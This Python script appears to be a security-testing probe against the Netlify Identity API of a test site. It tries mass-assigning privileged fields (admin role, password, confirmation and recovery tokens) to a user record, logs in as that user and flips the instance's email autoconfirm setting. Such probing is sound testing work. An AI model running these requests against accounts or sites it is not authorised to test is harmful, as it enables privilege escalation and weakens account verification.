# -*- coding: utf-8 -*-
# _idn_whitelist.py - probe PUT /users whitelist with full candidate fields; full-config PUT for instance
import json, urllib.request, urllib.error
from _net_creds import TOKEN_A, SITE_A

INST = '6a97f260e3e0091b16d132ce'
UID = '81a002fe-26a5-4033-af27-fa5559fcace5'
EMAIL = 'zztest-idn-0942@qq.com'
HOST = 'https://sec-test-rcf6lz.netlify.app/.netlify/identity'

def req(method, url, body=None, tok=None, ct='application/json'):
    hdrs = {}
    if tok: hdrs['Authorization'] = 'Bearer ' + tok
    data = None
    if body is not None:
        hdrs['Content-Type'] = ct
        if isinstance(body, bytes):
            data = body
        else:
            data = json.dumps(body).encode() if isinstance(body, (dict, list)) else body.encode()
    r = urllib.request.Request(url, method=method, headers=hdrs, data=data)
    try:
        resp = urllib.request.urlopen(r, timeout=25)
        return resp.status, resp.read(4000).decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read(4000).decode('utf-8','replace')
    except Exception as e:
        return 'ERR', str(e)[:150]

base = 'https://api.netlify.com/api/v1/sites/%s/identity/%s' % (SITE_A, INST)

print('=== 1. GET user before ===')
st, b = req('GET', base + '/users/%s' % UID, tok=TOKEN_A)
print(st, b[:800].replace('\n',' '))

print()
print('=== 2. PUT with broad candidate fields ===')
cand = {
    'role': 'admin', 'aud': 'authenticated', 'ban_duration': '0',
    'app_metadata': {'provider': 'email', 'role': 'admin'},
    'user_metadata': {'wl_probe': 1},
    'phone': '+10000000000', 'password': 'ZzTest!2345qa', 'email_confirm': True,
    'confirmation_token': 'wl-probe-tok', 'recovery_token': 'wl-probe-tok',
    'provider': 'email',
}
st, b = req('PUT', base + '/users/%s' % UID, cand, tok=TOKEN_A)
print('PUT ->', st, b[:400].replace('\n',' '))

print()
print('=== 3. GET user after (whitelist diff) ===')
st, b = req('GET', base + '/users/%s' % UID, tok=TOKEN_A)
print(st, b[:800].replace('\n',' '))
try:
    j = json.loads(b)
    print('role=%r aud=%r app_metadata=%r user_metadata=%r' % (
        j.get('role'), j.get('aud'), j.get('app_metadata'), j.get('user_metadata')))
    for k in ('phone', 'confirmation_token', 'recovery_token', 'confirmation_sent_at', 'confirmed_at'):
        if k in j: print('  !!', k, '=', j[k])
except Exception:
    pass

print()
print('=== 4. try login with role=admin user (if role persisted) ===')
st, b = req('POST', HOST + '/token',
            ('grant_type=password&email=%s&password=%s' % (EMAIL, 'ZzTest!2345qa')).encode(),
            ct='application/x-www-form-urlencoded')
print('login ->', st, b[:400].replace('\n',' '))

print()
print('=== 5. instance full-config PUT (autoconfirm flip) ===')
st, b = req('GET', base, tok=TOKEN_A)
inst = json.loads(b)
inst['config']['config']['mailer']['autoconfirm'] = True
st2, b2 = req('PUT', base, inst, tok=TOKEN_A)
print('GET inst ok, PUT full ->', st2, b2[:200].replace('\n',' '))
st3, b3 = req('GET', base, tok=TOKEN_A)
try:
    print('autoconfirm now =', json.loads(b3)['config']['config']['mailer']['autoconfirm'])
except Exception as e:
    print('recheck err', e, b3[:200])
